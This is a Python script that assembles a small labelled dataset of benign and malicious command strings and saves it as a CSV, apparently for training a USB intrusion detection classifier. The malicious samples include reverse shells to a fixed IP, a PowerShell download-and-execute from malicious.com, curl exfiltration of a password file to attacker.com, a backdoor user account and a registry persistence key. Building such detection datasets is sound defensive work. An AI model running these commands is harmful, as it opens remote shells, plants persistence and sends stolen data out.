import pandas as pd
import random

# Sample benign commands (normal user activities)
benign_samples = [
    "notepad.exe", "chrome.exe", "explorer.exe", "cd Documents", 
    "dir", "copy file.txt backup.txt", "ipconfig /all", "ping google.com"
]

# Sample malicious keystroke injection commands (Rubber Ducky, Teensy)
keystroke_injection_samples = [
    "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <base64_payload>",
    "cmd.exe /c net user hacker P@ssword123 /add",
    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Evil /t REG_SZ /d C:\\malware.exe",
    "Start-Process PowerShell -ArgumentList '-NoP -NonI -W Hidden -Exec Bypass'"
]

# Sample reverse shell attacks
reverse_shell_samples = [
    "nc -e /bin/sh 192.168.1.100 4444",
    "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
    "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://malicious.com')"
]

# Sample privilege escalation commands
privilege_escalation_samples = [
    "whoami /priv",
    "runas /user:Administrator cmd.exe",
    "exploit/windows/local/bypassuac"
]

# Sample data exfiltration commands
data_exfiltration_samples = [
    "curl -X POST -d @passwords.txt http://attacker.com/upload",
    "ftp -n -s:script.txt",
    "scp secret.zip user@192.168.1.5:/tmp/"
]

# Combine all attack samples into a dataset
data = []
for cmd in benign_samples:
    data.append((cmd, "benign"))
for cmd in keystroke_injection_samples:
    data.append((cmd, "keystroke_injection"))
for cmd in reverse_shell_samples:
    data.append((cmd, "reverse_shell"))
for cmd in privilege_escalation_samples:
    data.append((cmd, "privilege_escalation"))
for cmd in data_exfiltration_samples:
    data.append((cmd, "data_exfiltration"))

# Shuffle dataset
random.shuffle(data)

# Convert to DataFrame
df = pd.DataFrame(data, columns=["command", "attack_type"])
df.to_csv("usb_ids_dataset.csv", index=False)
print("Dataset saved as usb_ids_dataset.csv")
